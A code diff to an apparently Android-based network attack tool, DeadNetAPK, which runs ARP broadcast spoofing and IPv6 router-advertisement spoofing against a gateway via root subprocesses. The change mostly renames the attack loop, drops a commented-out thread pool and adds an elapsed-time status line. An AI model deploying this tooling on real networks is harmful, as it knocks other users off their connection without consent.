@@ -40,9 +40,9 @@ class DeadNetAPK:
 
     def __init__(self, iface: str, gateway_ipv4: str, gateway_ipv6: str, gateway_mac: str, print_mtd: str):
         self._spoof_ipv6ra_interval = 5
-        self._arp_sleep_interval = 0.075 # todo rename
-        self._nra_sleep_interval = 2 # todo rename
-        self._max_workers = 3 # todo remove
+        self._arp_sleep_interval = 0.075
+        self._nra_sleep_interval = 2
+        self._loop_sleep_interval = 0.5
 
         self._arp_bcast_proc = self._nra_proc = None  # todo typing
 
@@ -143,10 +143,6 @@ class DeadNetAPK:
         Logger.info(f"DeadNet: started arp bcast attack proc_id {self._arp_bcast_proc.pid}")
 
     def _ipv6_nra_attack(self) -> None:
-        # subprocess.Popen(f"su -c {self.nra_path} {self._gateway_mac} {self._gateway_ipv6} "
-        #                  f"{self._ipv6_prefix} {self._ipv6_preflen} {self._network_interface}",
-        #                  shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        # TODO add sleep and loop
         self._nra_proc = subprocess.Popen(
             ["su", "-c",
              f"{self.nra_path} {self._gateway_mac} {self._gateway_ipv6} {self._ipv6_prefix} "
@@ -172,22 +168,18 @@ class DeadNetAPK:
                 # todo add log here
                 Logger.error(f"DeadNet: Unable to kill {pid}: {e} - {traceback.format_exc()}")
 
-    def _start_workers_attack_loop(self) -> None:
-        # todo rename method name
-        # with ThreadPoolExecutor(max_workers=self._max_workers) as executor:
-        #     for idx, ip in enumerate(self._host_ipv4s):
-        #         if self._abort:
-        #             return
-        #         executor.submit(self._worker_attack_task, idx, ip)
+    def _start_attack_loop(self) -> None:
         # todo add elapsed time
 
         self._ipv4_arp_bcast_attack()
         self._ipv6_nra_attack()
-        Clock.schedule_once(lambda dt: self.print_mtd(f"{self._intro}status - {GREEN}running...{COLOR_RESET}"))
 
+        start = time.time()
         while not self._abort:
             # todo try raise exc here and see if we handle it correctly
-            time.sleep(0.5)  # todo into var
+            Clock.schedule_once(lambda dt: self.print_mtd(f"{self._intro}status - {GREEN}running...{COLOR_RESET}\n"
+                                                          f"time elapsed - {round(time.time() - start, 2)}[s]"))
+            time.sleep(self._loop_sleep_interval)  # todo into var
 
         self._terminate_all_attacks()
 
@@ -200,7 +192,7 @@ class DeadNetAPK:
 
     def start_attack(self) -> None:
         try:
-            self._start_workers_attack_loop()
+            self._start_attack_loop()
         except Exception as e:
             self._abort = "Error in attack loop (check debug logs)"
             Logger.error(f"DeadNet: start_attack exception - {e}, traceback: {traceback.format_exc()}")
